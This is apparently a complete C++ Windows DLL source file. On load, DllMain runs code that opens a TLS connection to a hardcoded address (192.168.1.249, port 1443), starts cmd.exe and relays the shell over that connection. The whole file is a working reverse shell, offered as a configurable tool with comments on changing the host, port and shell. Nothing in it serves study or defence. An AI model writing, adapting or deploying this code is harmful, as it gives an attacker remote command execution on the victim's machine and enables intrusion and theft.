// dllmain.cpp : Defines the entry point for the DLL application.
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "fwpuclnt.lib")
#pragma comment(lib, "crypt32")

#include "stdafx.h"
#include <string>
#include <iostream>
#include <stdlib.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <windows.h>
#include <openssl/ssl.h>

typedef HANDLE PIPE;
using namespace std;

int main() {

	// Change domain, port and shell executable if required
	char* domain = "192.168.1.249";
	char* port = "1443";
	wchar_t process[] = L"cmd.exe";

	// Typing this Cmd will cause the program to terminate
	const char* exitCmd = "EXITSHELL\r\n";

	// High bufferSize and high delayWait will result in huge chunks of output to be buffered and sent at one time.
	// Low bufferSize and low delayWait will result in "smooth" terminal experience at the expense of more small packets.  
	const int bufferSize = 4096;
	const int delayWait = 50;

	Sleep(1000);
	

	SOCKET sock = -1;
	WSADATA data = {};
	addrinfo *addrInfo = nullptr;
	sockaddr_in sockAddr = {};
	SSL_CTX *sslctx;
	SSL *cSSL;
	int result;
	char ipAddr[256];

	WSAStartup(MAKEWORD(2, 2), &data);

	addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve DNS
	int ret = getaddrinfo(domain, port, &hints, &addrInfo);
	wchar_t *s = NULL;

	addrinfo *p = addrInfo;
	while (p) {
		void *addr_addr = (void*)&((sockaddr_in*)p->ai_addr)->sin_addr;
		if (addr_addr) {
			inet_ntop(p->ai_family, addr_addr, ipAddr, sizeof(ipAddr));
			ipAddr[sizeof(ipAddr) - 1] = 0;
		}
		p = p->ai_next;
	}

	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);

	// Open socket successful
	if (sock != -1) {
		sockAddr.sin_family = AF_INET;
		inet_pton(AF_INET, ipAddr, &(sockAddr.sin_addr));
		sockAddr.sin_port = htons((unsigned short)strtoul(port, NULL, 0));
		result = WSAConnect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

		// Connection successful
		if (result != -1) {

			SSL_load_error_strings();
			SSL_library_init();
			OpenSSL_add_all_algorithms();
			sslctx = SSL_CTX_new(SSLv23_method());

			cSSL = SSL_new(sslctx);
			SSL_set_fd(cSSL, (int) sock);
			result = SSL_connect(cSSL);

			//SSL successful
			if (result != -1){

				char recvBuffer[bufferSize];
				char sendBuffer[bufferSize];
				SSL_write(cSSL, "Client Connected. Press Enter to spawn shell.\r\n", 48);
				memset(recvBuffer, 0, sizeof(recvBuffer));
				result = SSL_read(cSSL, (char *)recvBuffer, sizeof(recvBuffer));

				if (result != -1) {

					STARTUPINFO sInfo;
					SECURITY_ATTRIBUTES secAttrs;
					PROCESS_INFORMATION procInf;
					PIPE InWrite, InRead, OutWrite, OutRead;
					DWORD bytesReadFromPipe;
					DWORD exitCode;

					secAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
					secAttrs.bInheritHandle = TRUE;
					secAttrs.lpSecurityDescriptor = NULL;
					CreatePipe(&InWrite, &InRead, &secAttrs, 0);
					CreatePipe(&OutWrite, &OutRead, &secAttrs, 0);


					memset(&sInfo, 0, sizeof(sInfo));
					sInfo.cb = sizeof(sInfo);
					sInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
					sInfo.hStdInput = OutWrite;
					sInfo.hStdOutput = InRead;
					sInfo.hStdError = InRead;
					CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &procInf);

					while (sock != SOCKET_ERROR){
						
						// check if shell executable started with CreateProcess still running, if dead terminate.
						GetExitCodeProcess(procInf.hProcess, &exitCode);
						if (exitCode != STILL_ACTIVE) {

							SSL_CTX_free(sslctx);
							closesocket(sock);
							WSACleanup();
							memset(&sInfo, 0, sizeof(sInfo));
							memset(sendBuffer, 0, sizeof(sendBuffer));
							memset(recvBuffer, 0, sizeof(recvBuffer));
							exit(0);
						}

						Sleep(200);
						memset(sendBuffer, 0, sizeof(sendBuffer));
						PeekNamedPipe(InWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
						// while there is output from cmd
						while (bytesReadFromPipe){
							if (!ReadFile(InWrite, sendBuffer, sizeof(sendBuffer), &bytesReadFromPipe, NULL))
								break;
							else{
								SSL_write(cSSL, (char *)sendBuffer, (int) bytesReadFromPipe);
								memset(sendBuffer, 0, sizeof(sendBuffer));
								bytesReadFromPipe = 0;

								// Wait. If there is more output, go to top of loop and continue sending. common for long directory listings
								// duration may not be long enough for commands like systeminfo, in which case, a subsequent enter will display the output
								Sleep(delayWait);
								PeekNamedPipe(InWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
							}	
						}
						
						Sleep(200);
						memset(recvBuffer, 0, sizeof(recvBuffer));
						result = SSL_read(cSSL, (char *)recvBuffer, sizeof(recvBuffer));
						// Got new input from remote end
						if (result > 0) {
							if (strcmp(recvBuffer, exitCmd) == 0) {

								SSL_write(cSSL, "Exiting Shell. Goodbye.\r\n", 26);
								SSL_CTX_free(sslctx);
								closesocket(sock);
								WSACleanup();
								memset(&sInfo, 0, sizeof(sInfo));
								memset(sendBuffer, 0, sizeof(sendBuffer));
								memset(recvBuffer, 0, sizeof(recvBuffer));
								exit(0);
							}
							WriteFile(OutRead, recvBuffer, result, &bytesReadFromPipe, NULL);
							memset(recvBuffer, 0, sizeof(recvBuffer));
							result = 0;
						}

					}
				}
			}

			SSL_CTX_free(sslctx);

		}

		closesocket(sock);
		WSACleanup();
	}

	exit(1);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		main();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
